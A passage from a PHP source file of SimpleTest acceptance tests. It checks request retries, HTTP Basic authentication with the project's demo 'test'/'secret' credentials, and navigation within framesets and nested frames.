        $this->assertFalse($this->forward());
    }

    function testGetRetryResubmitsData() {
        $this->assertTrue($this->get(
                $this->samples() . 'network_confirm.php?a=aaa'));
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertText('a=[aaa]');
        $this->retry();
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertText('a=[aaa]');
    }

    function testGetRetryResubmitsExtraData() {
        $this->assertTrue($this->get(
                $this->samples() . 'network_confirm.php',
                array('a' => 'aaa')));
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertText('a=[aaa]');
        $this->retry();
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertText('a=[aaa]');
    }

    function testPostRetryResubmitsData() {
        $this->assertTrue($this->post(
                $this->samples() . 'network_confirm.php',
                array('a' => 'aaa')));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aaa]');
        $this->retry();
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aaa]');
    }

    function testGetRetryResubmitsRepeatedData() {
        $this->assertTrue($this->get(
                $this->samples() . 'network_confirm.php?a=1&a=2'));
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertText('a=[1, 2]');
        $this->retry();
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertText('a=[1, 2]');
    }
}

class TestOfLiveAuthentication extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testChallengeFromProtectedPage() {
        $this->get($this->samples() . 'protected/');
        $this->assertResponse(401);
        $this->assertAuthentication('Basic');
        $this->assertRealm('SimpleTest basic authentication');
        $this->assertRealm(new PatternExpectation('/simpletest/i'));
        $this->authenticate('test', 'secret');
        $this->assertResponse(200);
        $this->retry();
        $this->assertResponse(200);
    }

    function testTrailingSlashImpliedWithinRealm() {
        $this->get($this->samples() . 'protected/');
        $this->authenticate('test', 'secret');
        $this->assertResponse(200);
        $this->get($this->samples() . 'protected');
        $this->assertResponse(200);
    }

    function testTrailingSlashImpliedSettingRealm() {
        $this->get($this->samples() . 'protected');
        $this->authenticate('test', 'secret');
        $this->assertResponse(200);
        $this->get($this->samples() . 'protected/');
        $this->assertResponse(200);
    }

    function testEncodedAuthenticationFetchesPage() {
        $this->get('http://test:secret@www.lastcraft.com/test/protected/');
        $this->assertResponse(200);
    }

    function testEncodedAuthenticationFetchesPageAfterTrailingSlashRedirect() {
        $this->get('http://test:secret@www.lastcraft.com/test/protected');
        $this->assertResponse(200);
    }

    function testRealmExtendsToWholeDirectory() {
        $this->get($this->samples() . 'protected/1.html');
        $this->authenticate('test', 'secret');
        $this->clickLink('2');
        $this->assertResponse(200);
        $this->clickLink('3');
        $this->assertResponse(200);
    }

    function testRedirectKeepsAuthentication() {
        $this->get($this->samples() . 'protected/local_redirect.php');
        $this->authenticate('test', 'secret');
        $this->assertTitle('Simple test target file');
    }

    function testRedirectKeepsEncodedAuthentication() {
        $this->get('http://test:secret@www.lastcraft.com/test/protected/local_redirect.php');
        $this->assertResponse(200);
        $this->assertTitle('Simple test target file');
    }

    function testSessionRestartLosesAuthentication() {
        $this->get($this->samples() . 'protected/');
        $this->authenticate('test', 'secret');
        $this->assertResponse(200);
        $this->restart();
        $this->get($this->samples() . 'protected/');
        $this->assertResponse(401);
    }
}

class TestOfLoadingFrames extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testNoFramesContentWhenFramesDisabled() {
        $this->ignoreFrames();
        $this->get($this->samples() . 'one_page_frameset.html');
        $this->assertTitle('Frameset for testing of SimpleTest');
        $this->assertText('This content is for no frames only');
    }

    function testPatternMatchCanReadTheOnlyFrame() {
        $this->get($this->samples() . 'one_page_frameset.html');
        $this->assertText('A target for the SimpleTest test suite');
        $this->assertNoText('This content is for no frames only');
    }

    function testMessyFramesetResponsesByName() {
        $this->assertTrue($this->get(
                $this->samples() . 'messy_frameset.html'));
        $this->assertTitle('Frameset for testing of SimpleTest');

        $this->assertTrue($this->setFrameFocus('Front controller'));
        $this->assertResponse(200);
        $this->assertText('Simple test front controller');

        $this->assertTrue($this->setFrameFocus('One'));
        $this->assertResponse(200);
        $this->assertLink('2');

        $this->assertTrue($this->setFrameFocus('Frame links'));
        $this->assertResponse(200);
        $this->assertLink('Set one to 2');

        $this->assertTrue($this->setFrameFocus('Counter'));
        $this->assertResponse(200);
        $this->assertText('Count: 1');

        $this->assertTrue($this->setFrameFocus('Redirected'));
        $this->assertResponse(200);
        $this->assertText('r=rrr');

        $this->assertTrue($this->setFrameFocus('Protected'));
        $this->assertResponse(401);

        $this->assertTrue($this->setFrameFocus('Protected redirect'));
        $this->assertResponse(401);

        $this->assertTrue($this->setFrameFocusByIndex(1));
        $this->assertResponse(200);
        $this->assertText('Simple test front controller');

        $this->assertTrue($this->setFrameFocusByIndex(2));
        $this->assertResponse(200);
        $this->assertLink('2');

        $this->assertTrue($this->setFrameFocusByIndex(3));
        $this->assertResponse(200);
        $this->assertLink('Set one to 2');

        $this->assertTrue($this->setFrameFocusByIndex(4));
        $this->assertResponse(200);
        $this->assertText('Count: 1');

        $this->assertTrue($this->setFrameFocusByIndex(5));
        $this->assertResponse(200);
        $this->assertText('r=rrr');

        $this->assertTrue($this->setFrameFocusByIndex(6));
        $this->assertResponse(401);

        $this->assertTrue($this->setFrameFocusByIndex(7));
    }

    function testReloadingFramesetPage() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->assertText('Count: 1');
        $this->retry();
        $this->assertText('Count: 2');
        $this->retry();
        $this->assertText('Count: 3');
    }

    function testReloadingSingleFrameWithCookieCounter() {
        $this->get($this->samples() . 'counting_frameset.html');
        $this->setFrameFocus('a');
        $this->assertText('Count: 1');
        $this->setFrameFocus('b');
        $this->assertText('Count: 2');

        $this->setFrameFocus('a');
        $this->retry();
        $this->assertText('Count: 3');
        $this->retry();
        $this->assertText('Count: 4');
        $this->setFrameFocus('b');
        $this->assertText('Count: 2');
    }

    function testReloadingFrameWhenUnfocusedReloadsWholeFrameset() {
        $this->get($this->samples() . 'counting_frameset.html');
        $this->setFrameFocus('a');
        $this->assertText('Count: 1');
        $this->setFrameFocus('b');
        $this->assertText('Count: 2');

        $this->clearFrameFocus('a');
        $this->retry();

        $this->assertTitle('Frameset for testing of SimpleTest');
        $this->setFrameFocus('a');
        $this->assertText('Count: 3');
        $this->setFrameFocus('b');
        $this->assertText('Count: 4');
    }

    function testClickingNormalLinkReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickLink('2');
        $this->assertLink('3');
        $this->assertText('Simple test front controller');
    }

    function testJumpToNamedPageReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->assertPattern('/Simple test front controller/');
        $this->clickLink('Index');
        $this->assertResponse(200);
        $this->assertText('[action=index]');
        $this->assertText('Count: 1');
    }

    function testJumpToUnnamedPageReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickLink('No page');
        $this->assertResponse(200);
        $this->assertText('Simple test front controller');
        $this->assertText('[action=no_page]');
        $this->assertText('Count: 1');
    }

    function testJumpToUnnamedPageWithBareParameterReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickLink('Bare action');
        $this->assertResponse(200);
        $this->assertText('Simple test front controller');
        $this->assertText('[action=]');
        $this->assertText('Count: 1');
    }

    function testJumpToUnnamedPageWithEmptyQueryReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickLink('Empty query');
        $this->assertResponse(200);
        $this->assertPattern('/Simple test front controller/');
        $this->assertPattern('/raw get data.*?\[\].*?get data/si');
        $this->assertPattern('/Count: 1/');
    }

    function testJumpToUnnamedPageWithEmptyLinkReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickLink('Empty link');
        $this->assertResponse(200);
        $this->assertPattern('/Simple test front controller/');
        $this->assertPattern('/raw get data.*?\[\].*?get data/si');
        $this->assertPattern('/Count: 1/');
    }

    function testJumpBackADirectoryLevelReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickLink('Down one');
        $this->assertPattern('/index of .*\/test/i');
        $this->assertPattern('/Count: 1/');
    }

    function testSubmitToNamedPageReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->assertPattern('/Simple test front controller/');
        $this->clickSubmit('Index');
        $this->assertResponse(200);
        $this->assertText('[action=Index]');
        $this->assertText('Count: 1');
    }

    function testSubmitToSameDirectoryReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickSubmit('Same directory');
        $this->assertResponse(200);
        $this->assertText('[action=Same+directory]');
        $this->assertText('Count: 1');
    }

    function testSubmitToEmptyActionReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickSubmit('Empty action');
        $this->assertResponse(200);
        $this->assertText('[action=Empty+action]');
        $this->assertText('Count: 1');
    }

    function testSubmitToNoActionReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickSubmit('No action');
        $this->assertResponse(200);
        $this->assertText('[action=No+action]');
        $this->assertText('Count: 1');
    }

    function testSubmitBackADirectoryLevelReplacesJustThatFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickSubmit('Down one');
        $this->assertPattern('/index of .*\/test/i');
        $this->assertPattern('/Count: 1/');
    }

    function testTopLinkExitsFrameset() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->clickLink('Exit the frameset');
        $this->assertTitle('Simple test target file');
    }

    function testLinkInOnePageCanLoadAnother() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->assertNoLink('3');
        $this->clickLink('Set one to 2');
        $this->assertLink('3');
        $this->assertNoLink('2');
        $this->assertTitle('Frameset for testing of SimpleTest');
    }

    function testFrameWithRelativeLinksRespectsBaseTagForThatPage() {
        $this->get($this->samples() . 'base_tag/frameset.html');
        $this->click('Back to test pages');
        $this->assertTitle('Frameset for testing of SimpleTest');
        $this->assertText('A target for the SimpleTest test suite');
    }

    function testRelativeLinkInFrameIsNotAffectedByFramesetBaseTag() {
        $this->get($this->samples() . 'base_tag/frameset_with_base_tag.html');
        $this->assertText('This is page 1');
        $this->click('To page 2');
        $this->assertTitle('Frameset for testing of SimpleTest');
        $this->assertText('This is page 2');
    }
}

class TestOfFrameAuthentication extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testUnauthenticatedFrameSendsChallenge() {
        $this->get($this->samples() . 'protected/');
        $this->setFrameFocus('Protected');
        $this->assertAuthentication('Basic');
        $this->assertRealm('SimpleTest basic authentication');
        $this->assertResponse(401);
    }

    function testCanReadFrameFromAlreadyAuthenticatedRealm() {
        $this->get($this->samples() . 'protected/');
        $this->authenticate('test', 'secret');
        $this->get($this->samples() . 'messy_frameset.html');
        $this->setFrameFocus('Protected');
        $this->assertResponse(200);
        $this->assertText('A target for the SimpleTest test suite');
    }

    function testCanAuthenticateFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->setFrameFocus('Protected');
        $this->authenticate('test', 'secret');
        $this->assertResponse(200);
        $this->assertText('A target for the SimpleTest test suite');
        $this->clearFrameFocus();
        $this->assertText('Count: 1');
    }

    function testCanAuthenticateRedirectedFrame() {
        $this->get($this->samples() . 'messy_frameset.html');
        $this->setFrameFocus('Protected redirect');
        $this->assertResponse(401);
        $this->authenticate('test', 'secret');
        $this->assertResponse(200);
        $this->assertText('A target for the SimpleTest test suite');
        $this->clearFrameFocus();
        $this->assertText('Count: 1');
    }
}

class TestOfNestedFrames extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testCanNavigateToSpecificContent() {
        $this->get($this->samples() . 'nested_frameset.html');
        $this->assertTitle('Nested frameset for testing of SimpleTest');

        $this->assertPattern('/This is frame A/');
        $this->assertPattern('/This is frame B/');
        $this->assertPattern('/Simple test front controller/');
        $this->assertLink('2');
        $this->assertLink('Set one to 2');
        $this->assertPattern('/Count: 1/');
        $this->assertPattern('/r=rrr/');

        $this->setFrameFocus('pair');
        $this->assertPattern('/This is frame A/');
        $this->assertPattern('/This is frame B/');
        $this->assertNoPattern('/Simple test front controller/');
        $this->assertNoLink('2');

        $this->setFrameFocus('aaa');
        $this->assertPattern('/This is frame A/');
        $this->assertNoPattern('/This is frame B/');

        $this->clearFrameFocus();
        $this->assertResponse(200);
        $this->setFrameFocus('messy');
        $this->assertResponse(200);
        $this->setFrameFocus('Front controller');
        $this->assertResponse(200);
        $this->assertPattern('/Simple test front controller/');
        $this->assertNoLink('2');
    }

    function testReloadingFramesetPage() {
        $this->get($this->samples() . 'nested_frameset.html');
        $this->assertPattern('/Count: 1/');
        $this->retry();
        $this->assertPattern('/Count: 2/');
        $this->retry();
        $this->assertPattern('/Count: 3/');
    }

    function testRetryingNestedPageOnlyRetriesThatSet() {
        $this->get($this->samples() . 'nested_frameset.html');
        $this->assertPattern('/Count: 1/');
        $this->setFrameFocus('messy');
        $this->retry();
        $this->assertPattern('/Count: 2/');
        $this->setFrameFocus('Counter');
        $this->retry();
        $this->assertPattern('/Count: 3/');

        $this->clearFrameFocus();
        $this->setFrameFocus('messy');
        $this->setFrameFocus('Front controller');
        $this->retry();

        $this->clearFrameFocus();
        $this->assertPattern('/Count: 3/');
    }

    function testAuthenticatingNestedPage() {
        $this->get($this->samples() . 'nested_frameset.html');
        $this->setFrameFocus('messy');
        $this->setFrameFocus('Protected');
        $this->assertAuthentication('Basic');
        $this->assertRealm('SimpleTest basic authentication');
        $this->assertResponse(401);

        $this->authenticate('test', 'secret');
        $this->assertResponse(200);
        $this->assertPattern('/A target for the SimpleTest test suite/');
    }
}
?>